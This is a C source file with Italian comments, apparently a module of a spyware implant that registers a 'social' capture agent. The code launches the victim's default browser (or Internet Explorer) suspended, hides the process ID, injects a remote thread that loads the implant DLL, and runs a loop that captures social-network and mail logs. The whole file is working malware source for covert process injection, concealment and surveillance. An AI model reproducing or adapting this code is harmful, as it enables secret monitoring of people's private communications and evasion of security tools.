
// Globals
BOOL social_is_host_started = FALSE; // Indica se il processo host del thread social e' stato gia' lanciato

#define DEFAULT_MAX_MAIL_SIZE (1024*100)

typedef void (__stdcall *Social_MainLoop_t) (void);
typedef void (__stdcall *ExitProcess_T) (UINT);

typedef struct {
	HMCommonDataStruct pCommon;     // Necessario per usare HM_sCreateHookA. Definisce anche le funzioni come LoadLibrary
	char cDLLHookName[DLLNAMELEN];	// Nome della dll principal
	char cSocialMainLoop[64];          // Nome della funzione "social"
	ExitProcess_T pExitProcess;
} SocialThreadDataStruct;
SocialThreadDataStruct SocialThreadData;

// Thread remoto iniettato nel processo Social host
DWORD Social_HostThread(SocialThreadDataStruct *pDataThread)
{
	HMODULE hMainDLL;
	Social_MainLoop_t pSocial_MainLoop;
	INIT_WRAPPER(BYTE);

	hMainDLL = pDataThread->pCommon._LoadLibrary(pDataThread->cDLLHookName);
	if (!hMainDLL)
		pDataThread->pExitProcess(0);

	pSocial_MainLoop = (Social_MainLoop_t)pDataThread->pCommon._GetProcAddress(hMainDLL, pDataThread->cSocialMainLoop);
	
	// Invoca il ciclo principale 
	if (pSocial_MainLoop)
		pSocial_MainLoop();

	// Se il ciclo principale esce per qualche errore
	// il processo host viene chiuso
	pDataThread->pExitProcess(0);
	return 0;
}

// Lancia il thread Social nel processo dwPid
BOOL Social_StartThread(DWORD dwPid, HANDLE hHostProcess)
{
	HANDLE hThreadRem;
	DWORD dwThreadId;

	// Alloca dati e funzioni del thread Social nel processo dwPid
	if(HM_sCreateHookA(dwPid, NULL, NULL, (BYTE *)Social_HostThread, 600, (BYTE *)&SocialThreadData, sizeof(SocialThreadData)) == NULL)
		return FALSE;
	
	if ( !(hThreadRem = HM_SafeCreateRemoteThread(hHostProcess, NULL, 8192, (LPTHREAD_START_ROUTINE)SocialThreadData.pCommon.dwHookAdd, (LPVOID)SocialThreadData.pCommon.dwDataAdd, 0, &dwThreadId)) )
		return FALSE;
		
	CloseHandle(hThreadRem);
	return TRUE;
}

DWORD SocialHost_Setup()
{
	HMODULE hMod;

	VALIDPTR(hMod = GetModuleHandle("KERNEL32.DLL"));

	// API utilizzate dal thread remoto.... [KERNEL32.DLL]
	VALIDPTR(SocialThreadData.pCommon._LoadLibrary = (LoadLibrary_T) HM_SafeGetProcAddress(hMod, "LoadLibraryA"));
	VALIDPTR(SocialThreadData.pCommon._GetProcAddress = (GetProcAddress_T) HM_SafeGetProcAddress(hMod, "GetProcAddress"));
	VALIDPTR(SocialThreadData.pExitProcess = (ExitProcess_T) HM_SafeGetProcAddress(hMod, "ExitProcess"));

	HM_CompletePath(H4DLLNAME, SocialThreadData.cDLLHookName);
	_snprintf_s(SocialThreadData.cSocialMainLoop, sizeof(SocialThreadData.cSocialMainLoop), _TRUNCATE, "PPPFTBBP12");

	return 0;
}

BOOL StartSocialHost(char *process_name)
{
	STARTUPINFO si;
    PROCESS_INFORMATION pi;
	HANDLE Social_HostProcess;
	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;

	if ( SocialHost_Setup() != 0 )
		return FALSE;

	// Lancia il process host con il main thread stoppato
	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	HM_CreateProcess(process_name, CREATE_SUSPENDED, &si, &pi, 0);
	// Se HM_CreateProcess fallisce, pi.dwProcessId e' settato a 0
	if (!pi.dwProcessId) 
		return FALSE;
	
	Social_HostProcess = FNC(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
	if(Social_HostProcess == NULL) {
		SAFE_TERMINATEPROCESS(Social_HostProcess);
		return FALSE;
	}
	
	// Se e' a 64 bit ci risparmiamo i passi successivi e chiudiamo subito...
	if (IsX64Process(pi.dwProcessId)){
		SAFE_TERMINATEPROCESS(Social_HostProcess);
		return FALSE;
	}

	SET_PID_HIDE_STRUCT(pid_hide, pi.dwProcessId);
	AM_AddHide(HIDE_PID, &pid_hide);
	Sleep(3000);

	// Lancia il thread che eseguira' il main loop 
	if (!Social_StartThread(pi.dwProcessId, Social_HostProcess)) {
		SAFE_TERMINATEPROCESS(Social_HostProcess);
		return FALSE;
	}

	return TRUE;
}

// XXX Per disabilitare questo agente basta commentare il contenuto di questa funzione
void StartSocialCapture()
{
	char social_host[DLLNAMELEN+2]; // Il nome del processo avra' le ""

	// Solo la prima volta che viene startato uno degli agenti coinvolti il processo parte
	// Poi rimarra' sempre attivo fino all'uninstall. Al processo stesso il compito
	// di non catturare log per i moduli non attivi
	if (social_is_host_started)
		return;

	// Prova con il browser di default
	HM_GetDefaultBrowser(social_host);
	if (!StartSocialHost(social_host)) {
		// Se per qualche motivo non riesce a iniettarsi nel default browser, prova con IE32
		HM_GetIE32Browser(social_host);
		if (!StartSocialHost(social_host))
			return;
	}
	social_is_host_started = TRUE;
}

DWORD __stdcall PM_SocialAgentStartStop(BOOL bStartFlag, BOOL bReset)
{	
	if (bStartFlag) 
		social_process_control = SOCIAL_PROCESS_CONTINUE;
	else
		social_process_control = SOCIAL_PROCESS_PAUSE;
		
	return 1;
}

DWORD __stdcall PM_SocialAgentUnregister()
{
	social_process_control = SOCIAL_PROCESS_EXIT;
	return 1;
}

DWORD __stdcall PM_SocialAgentInit(JSONObject elem)
{
	// Segnala l'agent manager che questo agente e' sempre attivo. In questo modo verro' PM_SocialAgentStartStop verra' 
	// chiamata quando sara' necessario mettere in pausa l'agente
	// ma, soprattutto, verra chiamata per riattivarlo quando la pausa e' finita. Se il processo host non e' partito 
	// cambiare la variabile social_process_control e' comunque ininfluente
	AM_MonitorStartStop(PM_SOCIALAGENT, TRUE); 
	return 1;
}

void PM_SocialAgentRegister()
{
	social_process_control = SOCIAL_PROCESS_CONTINUE;
	max_social_mail_len = DEFAULT_MAX_MAIL_SIZE;
	AM_MonitorRegister(L"social", PM_SOCIALAGENT, NULL, (BYTE *)PM_SocialAgentStartStop, (BYTE *)PM_SocialAgentInit, (BYTE *)PM_SocialAgentUnregister);
}